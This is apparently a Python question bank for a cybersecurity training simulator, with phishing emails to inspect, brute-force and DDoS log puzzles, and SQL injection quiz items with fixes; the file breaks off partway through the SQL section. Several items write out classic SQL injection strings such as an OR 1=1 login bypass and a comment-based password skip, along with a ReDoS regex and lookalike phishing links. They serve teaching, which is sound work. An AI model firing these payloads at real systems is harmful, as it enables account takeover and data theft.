"""
questions.py - Complete question bank for all 3 difficulty levels.
Each level has 3+ unique questions per attack type = fully different every session.
Cyber-Attack Simulator & Defense Lab
"""

import random

# ══════════════════════════════════════════════════════════════════════════════
# PHISHING QUESTIONS
# Each entry: dict with email_data, clickable elements, correct_target, hint
# ══════════════════════════════════════════════════════════════════════════════

PHISHING_QUESTIONS = {

    "beginner": [
        {
            "id": "ph_b1",
            "title": "Fake PayPal Verification",
            "from_addr": "security@paypa1.com",
            "to_addr": "employee@company.com",
            "subject": "Urgent: Verify Your Account Now",
            "body_lines": [
                ("text",    "Dear Valued Customer,"),
                ("text",    ""),
                ("text",    "We detected unusual login activity on your account."),
                ("text",    "Click below to verify your identity immediately:"),
                ("text",    ""),
                ("link",    "http://paypa1-secure.evil-tk.com/verify",  "malicious_link"),
                ("text",    ""),
                ("text",    "Failure to verify will result in"),
                ("urgent",  "permanent account suspension.",            "urgency_text"),
                ("text",    ""),
                ("sender",  "-- PayPal Security Team",                  "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Look at the URL carefully — 'paypa1' uses digit 1 instead of letter l. That is a fake domain.",
            "explanation": "The link 'paypa1-secure.evil-tk.com' is a lookalike domain. Legitimate PayPal only uses paypal.com.",
            "logs": "MAIL|Incoming from: security@paypa1.com|ALERT|Domain mismatch: paypa1.com vs paypal.com|FILTER|Spam score: 8.7/10 HIGH RISK|MAIL|Suspicious link detected in body|SYSTEM|DMARC verification FAILED",
        },
        {
            "id": "ph_b2",
            "title": "Fake Bank Alert",
            "from_addr": "alerts@nationaI-bank.com",
            "to_addr": "user@office.com",
            "subject": "Your Account Has Been Locked",
            "body_lines": [
                ("text",    "Dear Account Holder,"),
                ("text",    ""),
                ("text",    "Your online banking access has been locked"),
                ("text",    "due to 3 incorrect password attempts."),
                ("text",    ""),
                ("text",    "To unlock your account, visit:"),
                ("link",    "http://nationaI-bank.login-verify.net/unlock", "malicious_link"),
                ("text",    ""),
                ("urgent",  "You have 12 hours before your account is closed.", "urgency_text"),
                ("text",    ""),
                ("sender",  "-- National Bank Security",                "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Check the sender domain carefully. 'nationaI' uses uppercase letter I instead of lowercase l.",
            "explanation": "The domain 'nationaI-bank.com' has a capital I instead of lowercase l — classic homograph attack.",
            "logs": "MAIL|From: alerts@nationaI-bank.com|ALERT|Homograph domain attack detected|FILTER|Typosquatting pattern found|MAIL|External link to login-verify.net|SYSTEM|SPF record mismatch",
        },
        {
            "id": "ph_b3",
            "title": "Fake IT Support",
            "from_addr": "it-support@company-helpdesk.net",
            "to_addr": "john.doe@company.com",
            "subject": "Password Expiry Notice",
            "body_lines": [
                ("text",    "Hi John,"),
                ("text",    ""),
                ("text",    "Your company password expires in 24 hours."),
                ("text",    "Please reset it immediately using the link below:"),
                ("text",    ""),
                ("link",    "http://company-helpdesk.net/reset?token=xK9mP2", "malicious_link"),
                ("text",    ""),
                ("text",    "Contact us if you have questions."),
                ("sender",  "-- IT Support Team",                       "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Legitimate IT departments use your company's own domain, not external sites like 'company-helpdesk.net'.",
            "explanation": "The reset link goes to an external domain 'company-helpdesk.net' — not the real company server.",
            "logs": "MAIL|From: it-support@company-helpdesk.net|ALERT|External domain impersonating IT dept|FILTER|Reset token in URL is suspicious|SYSTEM|Not from internal mail server",
        },
    ],

    "intermediate": [
        {
            "id": "ph_i1",
            "title": "Spear Phish — CEO Fraud",
            "from_addr": "ceo.johnson@company-corp.co",
            "to_addr": "accounts@company.com",
            "subject": "Urgent Wire Transfer Required",
            "body_lines": [
                ("text",    "Hi Sarah,"),
                ("text",    ""),
                ("text",    "I need you to process an urgent wire transfer of $45,000"),
                ("text",    "for a confidential acquisition deal closing today."),
                ("text",    ""),
                ("text",    "Transfer details are in the secure document:"),
                ("link",    "http://docs-company-secure.ru/transfer-details.pdf", "malicious_link"),
                ("text",    ""),
                ("urgent",  "This is time-sensitive. Do not discuss with anyone.", "urgency_text"),
                ("text",    ""),
                ("sender",  "-- Robert Johnson, CEO",                   "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "The CEO email uses 'company-corp.co' not 'company.com'. Also the .ru document link is a red flag.",
            "explanation": "CEO fraud (BEC) uses a near-identical domain. The .ru document link confirms malicious intent.",
            "logs": "MAIL|From: ceo.johnson@company-corp.co|ALERT|Domain mismatch — company-corp.co vs company.com|ALERT|Russian (.ru) document server detected|FILTER|BEC pattern: urgent wire transfer|SYSTEM|CEO email impersonation flagged",
        },
        {
            "id": "ph_i2",
            "title": "Fake Microsoft 365 Login",
            "from_addr": "no-reply@micros0ft-365.com",
            "to_addr": "employee@firm.com",
            "subject": "Action Required: Sign-in Attempt Blocked",
            "body_lines": [
                ("text",    "Microsoft Account Security"),
                ("text",    ""),
                ("text",    "A sign-in from an unrecognized device was blocked."),
                ("text",    "Location: Minsk, Belarus — 04:13 AM"),
                ("text",    ""),
                ("text",    "If this was not you, secure your account now:"),
                ("link",    "https://micros0ft-365.com/secure-login?ref=blocked", "malicious_link"),
                ("text",    ""),
                ("urgent",  "Ignore this if you recognise this sign-in.",         "urgency_text"),
                ("sender",  "-- Microsoft Account Team",               "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Microsoft uses microsoft.com only. 'micros0ft-365.com' uses zero instead of letter o.",
            "explanation": "'micros0ft-365.com' is a homoglyph attack — digit 0 replaces letter o. Real Microsoft never does this.",
            "logs": "MAIL|From: no-reply@micros0ft-365.com|ALERT|Homoglyph: 0 (zero) instead of o|FILTER|Fake Microsoft domain confirmed|MAIL|HTTPS does not equal legitimacy|SYSTEM|Phishing database match found",
        },
        {
            "id": "ph_i3",
            "title": "Fake HR Document",
            "from_addr": "hr.department@company-hr-portal.com",
            "to_addr": "staff@company.com",
            "subject": "Updated Employment Contract — Please Review",
            "body_lines": [
                ("text",    "Dear Team Member,"),
                ("text",    ""),
                ("text",    "Please review and sign your updated employment contract"),
                ("text",    "before the end of the week."),
                ("text",    ""),
                ("link",    "http://company-hr-portal.com/contracts/sign?id=8821", "malicious_link"),
                ("text",    ""),
                ("text",    "Contact HR if you have concerns."),
                ("urgent",  "Unsigned contracts will be escalated to management.", "urgency_text"),
                ("sender",  "-- Human Resources Department",            "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "HR portals should be on your company's own domain, not 'company-hr-portal.com' (a separate site).",
            "explanation": "The link goes to 'company-hr-portal.com' — a completely separate domain designed to harvest credentials.",
            "logs": "MAIL|From: hr.department@company-hr-portal.com|ALERT|External HR portal not on company domain|FILTER|Credential harvesting pattern detected|SYSTEM|Not sent from company mail server",
        },
    ],

    "expert": [
        {
            "id": "ph_e1",
            "title": "Advanced Supply Chain Attack",
            "from_addr": "invoices@trusted-vendor.support",
            "to_addr": "finance@targetcorp.com",
            "subject": "Invoice #INV-2026-4821 — Payment Overdue",
            "body_lines": [
                ("text",    "Dear Finance Team,"),
                ("text",    ""),
                ("text",    "Our records show Invoice #INV-2026-4821 ($12,340)"),
                ("text",    "remains unpaid after 30 days."),
                ("text",    ""),
                ("text",    "Please process payment or log into our portal:"),
                ("link",    "https://trusted-vendor.support/portal/inv-4821", "malicious_link"),
                ("text",    ""),
                ("text",    "Banking details have changed — updated details inside."),
                ("urgent",  "Late fees of 5% apply after 48 hours.",    "urgency_text"),
                ("sender",  "-- Accounts Receivable, Trusted Vendor Ltd", "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "'.support' TLD is often abused. The domain 'trusted-vendor.support' is different from the real vendor site. Banking details change notice is a major red flag.",
            "explanation": "Vendor impersonation with changed banking details is a BEC variant. The .support TLD and changed bank info are critical red flags.",
            "logs": "MAIL|From: invoices@trusted-vendor.support|ALERT|Non-standard TLD .support flagged|ALERT|Banking details change — high risk indicator|FILTER|Invoice fraud BEC pattern detected|SYSTEM|Domain registered 3 days ago",
        },
        {
            "id": "ph_e2",
            "title": "OAuth Consent Phishing",
            "from_addr": "noreply@googleapps-workspace.com",
            "to_addr": "developer@startup.io",
            "subject": "A third-party app is requesting access",
            "body_lines": [
                ("text",    "Google Workspace Security"),
                ("text",    ""),
                ("text",    "The app 'DevTools Pro' is requesting permission to:"),
                ("text",    "  - Read all your emails"),
                ("text",    "  - Access Google Drive files"),
                ("text",    "  - Manage your contacts"),
                ("text",    ""),
                ("link",    "https://googleapps-workspace.com/oauth/authorize?app=devtools", "malicious_link"),
                ("text",    ""),
                ("urgent",  "Deny access within 1 hour or permissions will be granted.", "urgency_text"),
                ("sender",  "-- Google Security",                       "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Google OAuth only happens at accounts.google.com — never at 'googleapps-workspace.com' (a fake domain).",
            "explanation": "OAuth phishing tricks users into granting app permissions via fake consent pages. Google uses accounts.google.com only.",
            "logs": "MAIL|From: noreply@googleapps-workspace.com|ALERT|Fake OAuth consent page detected|ALERT|Not from google.com or accounts.google.com|FILTER|Consent phishing attack pattern|SYSTEM|Domain googleapps-workspace.com is not Google",
        },
        {
            "id": "ph_e3",
            "title": "Multi-Stage Callback Phishing",
            "from_addr": "support@adobe-creative.help",
            "to_addr": "designer@agency.com",
            "subject": "Your Creative Cloud subscription has a billing issue",
            "body_lines": [
                ("text",    "Adobe Creative Cloud"),
                ("text",    ""),
                ("text",    "We could not process your payment for Creative Cloud."),
                ("text",    "Your subscription will pause in 24 hours."),
                ("text",    ""),
                ("text",    "Call our billing team to resolve this:"),
                ("link",    "https://adobe-creative.help/billing/issue?ref=CC2026", "malicious_link"),
                ("text",    "Or call:"),
                ("urgent",  "+1-888-ADOBE-FAKE (Toll Free)",            "urgency_text"),
                ("sender",  "-- Adobe Customer Support",                "sender_name"),
            ],
            "correct": "malicious_link",
            "hint": "Adobe uses adobe.com only. 'adobe-creative.help' is a fake domain. The phone number combined with a link is a multi-stage vishing+phishing attack.",
            "explanation": "This combines a fake link AND a vishing phone number — a multi-stage attack. Adobe.com is the only legitimate domain.",
            "logs": "MAIL|From: support@adobe-creative.help|ALERT|Fake domain: adobe-creative.help not adobe.com|ALERT|Phone number phishing (vishing) component detected|FILTER|Multi-stage phishing pattern|SYSTEM|Domain registered recently — not Adobe",
        },
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
# BRUTE FORCE QUESTIONS
# Each entry: log entries shown + the attacker IP to block
# ══════════════════════════════════════════════════════════════════════════════

BRUTEFORCE_QUESTIONS = {

    "beginner": [
        {
            "id": "bf_b1",
            "title": "SSH Login Attack",
            "description": "Multiple SSH login attempts detected on port 22. Type the attacking IP and click BLOCK.",
            "entries": [
                ("10.0.0.12",     "1 failed attempt",               False),
                ("192.168.1.5",   "2 failed attempts",              False),
                ("203.0.113.99",  "847 failed attempts — ATTACKER!", True),
                ("10.0.0.55",     "1 failed attempt",               False),
            ],
            "attacker_ip": "203.0.113.99",
            "hint": "The attacker always has hundreds of failed attempts. Normal users fail only 1-3 times.",
            "explanation": "203.0.113.99 made 847 attempts in 60 seconds — a clear automated brute force. Block immediately.",
            "logs": "AUTH|10.0.0.12 Login OK (1 attempt)|AUTH|192.168.1.5 failed (2 attempts)|ALERT|203.0.113.99 — 847 failed in 60s!|AUTH|10.0.0.55 Login OK|SYSTEM|Rate limit triggered on 203.0.113.99",
        },
        {
            "id": "bf_b2",
            "title": "FTP Brute Force",
            "description": "Repeated FTP login failures on port 21. Find and block the attacker IP.",
            "entries": [
                ("172.16.0.10",   "1 failed attempt",               False),
                ("10.10.0.3",     "3 failed attempts",              False),
                ("185.220.101.9", "512 failed attempts — ATTACKER!", True),
                ("192.168.0.20",  "2 failed attempts",              False),
            ],
            "attacker_ip": "185.220.101.9",
            "hint": "512 failed FTP logins in a short window means automated password spraying. One IP stands out clearly.",
            "explanation": "185.220.101.9 is a known Tor exit node used for automated attacks. 512 attempts confirms brute force.",
            "logs": "FTP|172.16.0.10 Login OK|FTP|10.10.0.3 failed (3 attempts)|ALERT|185.220.101.9 — 512 failed FTP logins!|FTP|192.168.0.20 failed (2 attempts)|SYSTEM|FTP brute force pattern detected",
        },
        {
            "id": "bf_b3",
            "title": "Web Panel Attack",
            "description": "Admin login panel under attack. Multiple IPs attempting access. Block the main attacker.",
            "entries": [
                ("10.0.1.5",      "1 failed attempt",               False),
                ("77.88.55.60",   "689 failed attempts — ATTACKER!", True),
                ("192.168.2.1",   "4 failed attempts",              False),
                ("10.0.1.22",     "Login OK (1 attempt)",           False),
            ],
            "attacker_ip": "77.88.55.60",
            "hint": "689 failed attempts is far above normal. Any user making hundreds of attempts is attacking, not forgetting their password.",
            "explanation": "77.88.55.60 with 689 failed attempts is dictionary-attacking the admin panel. Block this IP immediately.",
            "logs": "WEB|10.0.1.5 failed (1 attempt)|ALERT|77.88.55.60 — 689 failed admin logins!|WEB|192.168.2.1 failed (4 attempts)|WEB|10.0.1.22 Login OK|SYSTEM|Admin panel brute force alert",
        },
    ],

    "intermediate": [
        {
            "id": "bf_i1",
            "title": "RDP Password Spray",
            "description": "Remote Desktop attack detected. Multiple source IPs — find the coordinating node with most attempts.",
            "entries": [
                ("172.16.0.10",   "Login OK",                       False),
                ("10.0.0.3",      "4 failed attempts",              False),
                ("198.51.100.44", "1,203 failed attempts — MAIN ATTACKER!", True),
                ("192.168.0.9",   "1 failed attempt",               False),
                ("10.0.0.7",      "6 failed attempts",              False),
            ],
            "attacker_ip": "198.51.100.44",
            "hint": "In a spray attack, one coordinating IP has far more attempts than others. Look for 1000+ attempts.",
            "explanation": "198.51.100.44 sent 1,203 attempts — the C2 node coordinating the RDP spray. Others are decoys.",
            "logs": "RDP|172.16.0.10 Login OK|RDP|10.0.0.3 failed (4)|ALERT|198.51.100.44 — 1203 failed RDP attempts!|RDP|192.168.0.9 failed (1)|ALERT|Password spray pattern from 198.51.100.44|SYSTEM|Account lockouts triggered",
        },
        {
            "id": "bf_i2",
            "title": "Database Brute Force",
            "description": "PostgreSQL port 5432 under attack. Credential stuffing from external IP. Block the attacker.",
            "entries": [
                ("10.0.0.50",     "DB connect OK",                  False),
                ("10.0.0.51",     "2 auth failures",                False),
                ("91.108.4.200",  "2,891 auth failures — ATTACKER!", True),
                ("172.20.0.5",    "DB connect OK",                  False),
                ("10.0.0.52",     "1 auth failure",                 False),
            ],
            "attacker_ip": "91.108.4.200",
            "hint": "Internal IPs (10.x, 172.x) are trusted workstations. External IPs with thousands of failures are attackers.",
            "explanation": "91.108.4.200 is an external IP with 2,891 PostgreSQL auth failures — credential stuffing attack confirmed.",
            "logs": "DB|10.0.0.50 connect OK|DB|10.0.0.51 auth fail x2|ALERT|91.108.4.200 — 2891 DB auth failures!|DB|172.20.0.5 connect OK|ALERT|Credential stuffing on PostgreSQL port 5432|SYSTEM|External IP rate limit exceeded",
        },
        {
            "id": "bf_i3",
            "title": "API Key Stuffing",
            "description": "API endpoint /auth/token receiving credential stuffing. Identify the attacking source.",
            "entries": [
                ("10.10.5.1",     "API OK — user login",            False),
                ("10.10.5.2",     "API OK — user login",            False),
                ("45.33.32.156",  "3,442 failed API auths — ATTACKER!", True),
                ("10.10.5.9",     "1 failed API auth",              False),
                ("192.168.1.100", "API OK — user login",            False),
            ],
            "attacker_ip": "45.33.32.156",
            "hint": "3,442 API authentication failures from one external IP is a textbook credential stuffing attack.",
            "explanation": "45.33.32.156 with 3,442 API failures is running a credential stuffing tool (e.g. Sentry MBA) against the API.",
            "logs": "API|10.10.5.1 auth OK|API|10.10.5.2 auth OK|ALERT|45.33.32.156 — 3442 API auth failures!|API|10.10.5.9 failed (1)|ALERT|Credential stuffing tool signature detected|SYSTEM|WAF should block 45.33.32.156",
        },
    ],

    "expert": [
        {
            "id": "bf_e1",
            "title": "Slow-Rate Brute Force",
            "description": "Low-and-slow brute force evading rate limiting. Identify the persistent attacker among normal traffic.",
            "entries": [
                ("10.0.0.30",     "Login OK",                       False),
                ("203.0.113.5",   "48 failed over 6 hours — ATTACKER!", True),
                ("10.0.0.31",     "Login OK",                       False),
                ("172.31.0.9",    "3 failed attempts",              False),
                ("10.0.0.35",     "Login OK",                       False),
            ],
            "attacker_ip": "203.0.113.5",
            "hint": "Slow-rate attacks space attempts over hours to avoid lockouts. 48 failures over 6 hours from one external IP is still suspicious.",
            "explanation": "203.0.113.5 uses slow-rate brute forcing (1 attempt per 7 min) to evade lockout policies — still a threat.",
            "logs": "AUTH|10.0.0.30 Login OK|ALERT|203.0.113.5 — 48 failures over 6 hours (slow-rate)|AUTH|10.0.0.31 Login OK|AUTH|172.31.0.9 failed x3|ALERT|Slow-rate brute force — evading lockout policy|SYSTEM|Behavioural anomaly: 203.0.113.5 persistent failures",
        },
        {
            "id": "bf_e2",
            "title": "Distributed Credential Stuffing",
            "description": "Botnet-distributed stuffing from many IPs — one has significantly higher volume. Block the C2 node.",
            "entries": [
                ("185.100.87.11", "22 failed attempts",             False),
                ("185.100.87.12", "19 failed attempts",             False),
                ("185.100.87.13", "967 failed — C2 NODE!",          True),
                ("185.100.87.14", "18 failed attempts",             False),
                ("10.0.0.1",      "Login OK",                       False),
            ],
            "attacker_ip": "185.100.87.13",
            "hint": "In a botnet attack, most nodes do similar low volumes. The C2 coordination node has significantly more traffic.",
            "explanation": "185.100.87.13 is the C2 node directing the botnet — 967 attempts vs ~20 for each bot confirms this.",
            "logs": "AUTH|185.100.87.11 — 22 failures|AUTH|185.100.87.12 — 19 failures|ALERT|185.100.87.13 — 967 failures (C2 node!)|AUTH|185.100.87.14 — 18 failures|ALERT|Distributed botnet credential stuffing|SYSTEM|Block /24 subnet 185.100.87.0/24",
        },
        {
            "id": "bf_e3",
            "title": "Kerberoasting Attack",
            "description": "Active Directory Kerberos ticket requests spiking. Identify the internal attacker doing Kerberoasting.",
            "entries": [
                ("10.0.1.10",     "Normal Kerberos activity",       False),
                ("10.0.1.11",     "Normal Kerberos activity",       False),
                ("10.0.1.99",     "4,200 TGS requests — ATTACKER!", True),
                ("10.0.1.12",     "Normal Kerberos activity",       False),
                ("10.0.1.13",     "Normal Kerberos activity",       False),
            ],
            "attacker_ip": "10.0.1.99",
            "hint": "Kerberoasting requests thousands of TGS tickets for offline cracking. 4,200 TGS requests from one internal machine is the attack.",
            "explanation": "10.0.1.99 is Kerberoasting — requesting 4,200 TGS tickets to crack service account passwords offline.",
            "logs": "AD|10.0.1.10 normal TGS request|AD|10.0.1.11 normal TGS request|ALERT|10.0.1.99 — 4200 TGS requests in 2 min!|AD|10.0.1.12 normal activity|ALERT|Kerberoasting pattern: mass SPN enumeration|SYSTEM|Lateral movement risk — isolate 10.0.1.99",
        },
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
# DDoS QUESTIONS
# Each entry: traffic entries (ip, pkt_rate_display, is_flood), hint, explanation
# ══════════════════════════════════════════════════════════════════════════════

DDOS_QUESTIONS = {

    "beginner": [
        {
            "id": "dd_b1",
            "title": "HTTP Flood Attack",
            "description": "HTTP flood hitting the web server. Block flood sources, allow real users.",
            "traffic": [
                ("45.33.32.156",  "8,400 pkt/s",   True),
                ("10.0.0.23",     "12 pkt/s",       False),
                ("198.51.100.7",  "6,200 pkt/s",   True),
                ("172.16.0.5",    "8 pkt/s",        False),
                ("203.0.113.44",  "9,100 pkt/s",   True),
            ],
            "hint": "Any IP sending thousands of packets per second is a flood source. Legitimate users send under 100 pkt/s.",
            "explanation": "IPs sending 6,000-9,000+ pkt/s are flood bots. Internal IPs (10.x, 172.x) with low rates are real users.",
            "logs": "NET|Traffic spike: 42,000 req/sec|ALERT|Server CPU 98% Memory 94%|NET|45.33.32.156 — 8400 pkt/s FLOOD|NET|10.0.0.23 — 12 pkt/s normal|SYSTEM|DDoS mitigation module ACTIVE",
        },
        {
            "id": "dd_b2",
            "title": "Volumetric UDP Flood",
            "description": "UDP flood detected on the DNS server. Classify each source correctly.",
            "traffic": [
                ("10.10.0.5",     "7 pkt/s",        False),
                ("104.21.44.0",   "11,200 pkt/s",  True),
                ("192.168.1.20",  "4 pkt/s",        False),
                ("5.188.210.0",   "7,800 pkt/s",   True),
                ("10.10.0.8",     "9 pkt/s",        False),
            ],
            "hint": "UDP flood IPs come from foreign ranges and send 5000+ pkt/s. Internal 10.x and 192.168.x are legitimate.",
            "explanation": "104.21.44.0 and 5.188.210.0 are external flood sources. Internal private IPs are legitimate DNS clients.",
            "logs": "NET|UDP flood on port 53 DNS|ALERT|104.21.44.0 — 11200 pkt/s CRITICAL|NET|10.10.0.5 — 7 pkt/s normal|ALERT|5.188.210.0 — 7800 pkt/s FLOOD|SYSTEM|DNS amplification attack detected",
        },
        {
            "id": "dd_b3",
            "title": "SYN Flood on Port 80",
            "description": "TCP SYN flood overwhelming the web server. Allow real connections, block SYN flood sources.",
            "traffic": [
                ("192.168.0.10",  "6 pkt/s",        False),
                ("91.108.56.0",   "15,300 pkt/s",  True),
                ("192.168.0.11",  "11 pkt/s",       False),
                ("77.88.44.0",    "9,500 pkt/s",   True),
                ("192.168.0.15",  "5 pkt/s",        False),
            ],
            "hint": "SYN flood sources send over 1,000 half-open connections per second. Your internal 192.168.x users are safe.",
            "explanation": "91.108.56.0 and 77.88.44.0 are sending SYN packets at over 9,000/s — exhausting server connection tables.",
            "logs": "NET|SYN flood on TCP port 80|ALERT|91.108.56.0 — 15300 SYN/sec!|NET|192.168.0.10 — 6 pkt/s normal|ALERT|77.88.44.0 — 9500 SYN/sec!|SYSTEM|Connection table 97% full — service degraded",
        },
    ],

    "intermediate": [
        {
            "id": "dd_i1",
            "title": "Application Layer (L7) Attack",
            "description": "Layer 7 HTTP GET flood targeting /api/search. More subtle — classify 6 sources.",
            "traffic": [
                ("203.0.113.1",   "11,200 pkt/s",  True),
                ("10.10.0.5",     "8 pkt/s",        False),
                ("185.220.101.3", "8,900 pkt/s",   True),
                ("172.20.0.8",    "6 pkt/s",        False),
                ("91.108.56.0",   "13,400 pkt/s",  True),
                ("10.0.0.99",     "14 pkt/s",       False),
            ],
            "hint": "L7 attacks target specific endpoints. Rates above 5,000 pkt/s from external IPs are flood sources.",
            "explanation": "Three external IPs (203.0.x, 185.x, 91.x) flood /api/search. Three internal IPs (10.x, 172.x) are real users.",
            "logs": "NET|L7 flood on /api/search endpoint|ALERT|203.0.113.1 — 11200 req/sec|ALERT|185.220.101.3 — 8900 req/sec|ALERT|91.108.56.0 — 13400 req/sec|SYSTEM|API gateway rate limiting triggered",
        },
        {
            "id": "dd_i2",
            "title": "Amplification Attack (NTP)",
            "description": "NTP amplification attack using spoofed requests. Identify and block the amplifier IPs.",
            "traffic": [
                ("198.51.100.0",  "22,000 pkt/s",  True),
                ("10.0.5.10",     "3 pkt/s",        False),
                ("104.16.0.0",    "17,500 pkt/s",  True),
                ("10.0.5.11",     "5 pkt/s",        False),
                ("5.9.0.0",       "19,300 pkt/s",  True),
                ("172.16.10.1",   "2 pkt/s",        False),
            ],
            "hint": "NTP amplification produces massive pkt/s from external IPs. Amplification factor is ~556x. Block all sources above 10,000 pkt/s.",
            "explanation": "NTP amplification IPs send 17,000-22,000 pkt/s using spoofed UDP. Internal private IPs are legitimate.",
            "logs": "NET|NTP amplification attack detected|ALERT|198.51.100.0 — 22000 pkt/s (amplified)|ALERT|104.16.0.0 — 17500 pkt/s|ALERT|5.9.0.0 — 19300 pkt/s|SYSTEM|Null-route upstream — contact ISP",
        },
        {
            "id": "dd_i3",
            "title": "Slowloris Attack",
            "description": "Slowloris keeps connections open with partial requests. Low pkt/s but high connection count. Block the Slowloris IPs.",
            "traffic": [
                ("46.101.0.0",    "180 conn (Slowloris)", True),
                ("10.0.0.40",     "2 connections",         False),
                ("139.162.0.0",   "240 conn (Slowloris)", True),
                ("10.0.0.41",     "1 connection",          False),
                ("104.236.0.0",   "190 conn (Slowloris)", True),
                ("10.0.0.42",     "3 connections",         False),
            ],
            "hint": "Slowloris holds hundreds of partial connections from one IP. Legitimate users have 1-5 connections. High connection count = Slowloris.",
            "explanation": "Slowloris attackers maintain 180-240 simultaneous partial HTTP connections to exhaust server thread pools.",
            "logs": "NET|Slowloris pattern detected — partial HTTP headers|ALERT|46.101.0.0 — 180 open connections!|ALERT|139.162.0.0 — 240 open connections!|ALERT|104.236.0.0 — 190 open connections!|SYSTEM|Apache MaxClients reached — rejecting new connections",
        },
    ],

    "expert": [
        {
            "id": "dd_e1",
            "title": "Low-Volume Precision DDoS",
            "description": "Precision attack targeting a CPU-intensive API endpoint. Low volume but enough to cause outages. Classify carefully.",
            "traffic": [
                ("185.220.101.1", "340 req/s (targeted)", True),
                ("10.20.0.5",     "18 req/s",             False),
                ("185.220.101.2", "290 req/s (targeted)", True),
                ("10.20.0.6",     "22 req/s",             False),
                ("185.220.101.3", "410 req/s (targeted)", True),
                ("10.20.0.7",     "11 req/s",             False),
            ],
            "hint": "At expert level, attacks can be low volume but still dangerous by targeting heavy operations. External IPs in the same /24 subnet are coordinated.",
            "explanation": "300-400 req/s targeting a heavy crypto endpoint can cause 100% CPU. The /24 subnet 185.220.101.x is a coordinated attack.",
            "logs": "NET|CPU spike on /api/crypto-sign endpoint|ALERT|185.220.101.1 — 340 targeted req/s|ALERT|185.220.101.2 — 290 targeted req/s|ALERT|185.220.101.3 — 410 targeted req/s|SYSTEM|Precision DDoS — block 185.220.101.0/24",
        },
        {
            "id": "dd_e2",
            "title": "BGP Hijack + DDoS Combo",
            "description": "Advanced attack combining BGP hijack with flood. Identify all malicious sources — some are spoofed internal IPs.",
            "traffic": [
                ("10.0.99.1",     "4,200 pkt/s (SPOOFED)", True),
                ("192.168.99.1",  "3,800 pkt/s (SPOOFED)", True),
                ("10.0.0.100",    "15 pkt/s",               False),
                ("45.33.0.0",     "12,000 pkt/s",           True),
                ("10.0.0.101",    "8 pkt/s",                False),
                ("46.101.5.0",    "9,500 pkt/s",            True),
            ],
            "hint": "In BGP hijack attacks, spoofed internal IPs (10.99.x, 192.168.99.x) appear in logs. Real internal clients are 10.0.0.100 and .101.",
            "explanation": "10.0.99.1 and 192.168.99.1 are spoofed — real machines have known IPs. Plus two external flood sources.",
            "logs": "NET|BGP route hijack detected — spoofed internal IPs|ALERT|10.0.99.1 — spoofed internal (4200 pkt/s)|ALERT|192.168.99.1 — spoofed internal (3800 pkt/s)|ALERT|45.33.0.0 — external flood 12000 pkt/s|SYSTEM|BGP blackhole + uRPF filtering needed",
        },
        {
            "id": "dd_e3",
            "title": "ReDoS (Regex DoS) Attack",
            "description": "ReDoS attack sending malicious regex inputs to the search API. Identify which IPs are sending attack payloads.",
            "traffic": [
                ("203.0.113.10",  "85 req/s (ReDoS payload)", True),
                ("10.5.0.20",     "12 req/s",                  False),
                ("198.51.0.5",    "92 req/s (ReDoS payload)",  True),
                ("10.5.0.21",     "9 req/s",                   False),
                ("185.156.0.8",   "78 req/s (ReDoS payload)",  True),
                ("10.5.0.22",     "14 req/s",                  False),
            ],
            "hint": "ReDoS sends crafted regex strings that cause exponential backtracking. Even 80 req/s of these can hang the server. External IPs with payload markers are attackers.",
            "explanation": "ReDoS payloads like '(a+)+$' cause catastrophic backtracking. Even low request rates cause 100% CPU. Block all 3 external sources.",
            "logs": "NET|ReDoS pattern in /api/search inputs|ALERT|203.0.113.10 — crafted regex payload detected|ALERT|198.51.0.5 — catastrophic backtracking inputs|ALERT|185.156.0.8 — ReDoS attack signature|SYSTEM|Regex engine CPU 100% — input validation needed",
        },
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
# SQL INJECTION QUESTIONS
# Each entry: malicious query shown, 4 options, correct answer key, explanation
# ══════════════════════════════════════════════════════════════════════════════

SQLI_QUESTIONS = {

    "beginner": [
        {
            "id": "sq_b1",
            "title": "Login Bypass",
            "description": "Classic OR 1=1 injection in the login form. Select the correct fix.",
            "query": "SELECT * FROM users WHERE username='' OR 1=1--'",
            "query_note": "This bypasses authentication — always returns all users.",
            "options": [
                ("add_captcha",           "Add a CAPTCHA to the login form"),
                ("parameterized_queries", "Use parameterized queries (prepared statements)"),
                ("filter_quotes",         "Remove single quotes with str.replace(\"'\", \"\")"),
                ("longer_passwords",      "Enforce longer minimum passwords"),
            ],
            "correct": "parameterized_queries",
            "hint": "Parameterized queries are the ONLY complete fix. They separate code from data at the database driver level.",
            "explanation": "Parameterized queries pass data as typed parameters — the DB driver never treats input as SQL code.",
            "logs": "DB|Query: SELECT * FROM users WHERE username='' OR 1=1--'|ALERT|SQL injection payload: OR 1=1 (always true)|DB|All 5,420 user records exposed!|ALERT|Authentication bypass successful|SYSTEM|WAF flagged — immediate patching required",
        },
        {
            "id": "sq_b2",
            "title": "Password Field Injection",
            "description": "Attacker injected a comment sequence to bypass password check.",
            "query": "SELECT * FROM users WHERE user='admin'--' AND password='x'",
            "query_note": "The -- comment ignores the password check entirely.",
            "options": [
                ("hash_passwords",        "Hash passwords with bcrypt"),
                ("disable_accounts",      "Lock accounts after 5 failed attempts"),
                ("parameterized_queries", "Use parameterized queries (prepared statements)"),
                ("validate_length",       "Validate username/password length"),
            ],
            "correct": "parameterized_queries",
            "hint": "Hashing passwords is good practice but does NOT fix injection. Only parameterized queries prevent the injection itself.",
            "explanation": "The -- comment makes the DB skip the password check. Parameterized queries prevent any SQL metacharacter from working.",
            "logs": "DB|Query: SELECT * FROM users WHERE user='admin'--' AND pass='x'|ALERT|SQL comment injection — password check skipped!|DB|Admin account compromised|ALERT|Privilege escalation via SQL injection|SYSTEM|Critical: admin panel accessible",
        },
        {
            "id": "sq_b3",
            "title": "Search Box Injection",
            "description": "SQL injection via search input field — data is being dumped.",
            "query": "SELECT * FROM products WHERE name='' OR '1'='1'",
            "query_note": "Returns entire product table regardless of input.",
            "options": [
                ("parameterized_queries", "Use parameterized queries (prepared statements)"),
                ("client_validation",     "Add JavaScript validation on the search field"),
